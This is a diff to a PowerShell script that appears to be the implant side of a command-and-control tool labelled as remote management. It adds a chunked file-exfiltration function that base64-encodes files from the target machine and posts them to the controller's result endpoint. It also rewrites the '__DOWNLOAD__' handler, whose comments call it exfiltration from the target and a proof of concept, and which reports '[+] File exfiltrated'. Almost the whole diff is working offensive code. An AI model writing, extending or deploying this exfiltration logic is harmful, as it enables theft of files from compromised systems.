@@ -738,6 +738,58 @@ function Send-RmmTextResult {
     Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
 }
 
+function Send-RmmFileDownload {
+    param(
+        [Parameter(Mandatory = $true)][string]$FilePath,
+        [hashtable]$Headers = @{}
+    )
+    $fileName = Split-Path $FilePath -Leaf
+    $uploadId = [guid]::NewGuid().ToString('N')
+    $chunkBytes = 6MB
+    $resultUrl = "$u/result?id=$sessionId&type=file_upload"
+    $fs = [System.IO.File]::OpenRead($FilePath)
+    try {
+        $offset = [long]0
+        $fileLen = $fs.Length
+        if ($fileLen -eq 0) {
+            $payload = @{
+                filename  = $fileName
+                upload_id = $uploadId
+                offset    = 0
+                eof       = $true
+                content   = ''
+            } | ConvertTo-Json -Compress
+            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
+            return
+        }
+        while ($true) {
+            $buf = New-Object byte[] $chunkBytes
+            $n = $fs.Read($buf, 0, $chunkBytes)
+            if ($n -le 0) { break }
+            if ($n -lt $chunkBytes) {
+                $slice = New-Object byte[] $n
+                [Array]::Copy($buf, $slice, $n)
+                $b64 = [Convert]::ToBase64String($slice)
+            } else {
+                $b64 = [Convert]::ToBase64String($buf)
+            }
+            $eof = ($offset + $n) -ge $fileLen
+            $payload = @{
+                filename  = $fileName
+                upload_id = $uploadId
+                offset    = $offset
+                eof       = $eof
+                content   = $b64
+            } | ConvertTo-Json -Compress
+            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
+            $offset += $n
+            if ($eof) { break }
+        }
+    } finally {
+        $fs.Dispose()
+    }
+}
+
 function Read-RmmSocksTcpChunk {
     param(
         [System.Net.Sockets.TcpClient]$Tcp,
@@ -1704,25 +1756,15 @@ while ($true) {
                 continue
             }
             elseif ($command -like "__DOWNLOAD__ *") {
-                # File download (exfiltrate file from target) — server expects one JSON body: filename + content (base64)
                 $filePath = $command.Substring(12).Trim()
-                if (Test-Path $filePath) {
-                    $maxB64Chars = 12000000  # ~9MB binary cap; avoids huge single POST on PoC
-                    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-                    $fileBase64 = [Convert]::ToBase64String($fileBytes)
-                    $fileName = Split-Path $filePath -Leaf
-                    if ($fileBase64.Length -gt $maxB64Chars) {
-                        $err = "File too large for PoC single-shot upload (base64 length $($fileBase64.Length) > $maxB64Chars)"
+                if (Test-Path $filePath -PathType Leaf) {
+                    try {
+                        Send-RmmFileDownload -FilePath $filePath -Headers $headers
+                        Write-Host "[+] File exfiltrated: $filePath" -ForegroundColor Green
+                    } catch {
+                        $err = "Download failed: $($_.Exception.Message)"
                         Send-RmmTextResult -CommandLine $command -Text $err -Headers $headers
                         Write-Host "[-] $err" -ForegroundColor Red
-                    } else {
-                        $resultData = @{
-                            filename = $fileName
-                            content = $fileBase64
-                        } | ConvertTo-Json -Compress
-                        $resultUrl = "$u/result?id=$sessionId&type=file_upload"
-                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $resultData -ContentType "application/json" -Headers $headers -RestErrorAction Stop
-                        Write-Host "[+] File exfiltrated: $filePath" -ForegroundColor Green
                     }
                 } else {
                     $errorMsg = "File not found: $filePath"
